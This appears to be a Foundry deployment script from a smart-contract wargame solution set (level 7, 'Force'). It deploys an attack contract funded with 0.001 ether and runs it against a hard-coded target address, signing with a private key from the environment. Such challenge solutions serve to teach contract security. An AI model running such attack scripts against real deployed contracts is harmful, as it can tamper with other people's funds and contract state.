// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/attacks/level07/Attack.sol";

contract ForceScript is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address target = 0x440E489ce7024F4A1AbB5f33984F747C5396f3C7;
        vm.startBroadcast(privateKey);
        ForceAttack attacker = new ForceAttack{value: 0.001 ether}();
        attacker.attack(target);
        vm.stopBroadcast();
    }
}